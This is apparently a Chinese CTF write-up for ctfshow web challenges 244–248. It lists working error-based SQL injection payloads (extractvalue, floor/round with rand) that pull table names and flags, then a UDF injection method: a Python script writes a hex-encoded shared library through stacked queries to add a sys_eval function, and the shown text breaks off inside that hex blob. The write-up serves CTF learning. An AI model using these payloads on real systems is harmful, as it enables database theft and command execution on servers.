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" width="340" height="118" class="img_ev3q"></p>
<p>我猜updatexml()和extractvalue()应该都可以</p>
<p>245过滤了updatexml，所以这里统一放extractvalue</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">web244</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),0x7e))--+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,30),0x7e))+--+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),20,30),0x7e))+--+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">web245同理</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web246">web246<a href="#web246" class="hash-link" aria-label="Direct link to web246" title="Direct link to web246">​</a></h3>
<p>error</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">过滤updatexml extractvalue</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>那么除此之外还有哪些呢？</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1.floor()、round()、ceil()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2.exp() //5.5.5版本之后可以使用</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3.name_const </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>floor报错，利用主键的重复实现报错，而且很明显，在web222已经讲到了，自己看web222</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; union select 1,count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))b from information_schema.tables group by b--+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x7e,floor(rand(0)*2))b from information_schema.tables group by b --+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=1&#x27; union select 1,count(*),concat(0x7e,(select flag2 from ctfshow_flags),0x7e,floor(rand(0)*2))b from information_schema.tables group by b--+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web247">web247<a href="#web247" class="hash-link" aria-label="Direct link to web247" title="Direct link to web247">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">过滤updatexml extractvalue floor</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看上面的，用别的，如改成round即可，需要注意的是字段名flag变成了flag?，表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。所以最终的payload为</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/api/?id=&#x27; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web248">web248<a href="#web248" class="hash-link" aria-label="Direct link to web248" title="Direct link to web248">​</a></h3>
<p>eval</p>
<p>UDF注入。诶好像做终极考核的时候用到过？</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但是我不会，这里就直接看师傅的做法和脚本</p>
<p>把dll文件写到目标机子的plugin目录</p>
<p>首先 1&#x27;; select @@plugin_dir; --+查出路径为/usr/lib/mariadb/plugin/</p>
<p>然后CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;; //导入udf函数</p>
<p>利用堆叠注入写进去</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base_url</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;http://994eba84-9ea5-4701-b204-01320382100c.challenge.ctf.show/api/&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">text </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;a&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;b&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;c&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;d&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;e&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">udf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2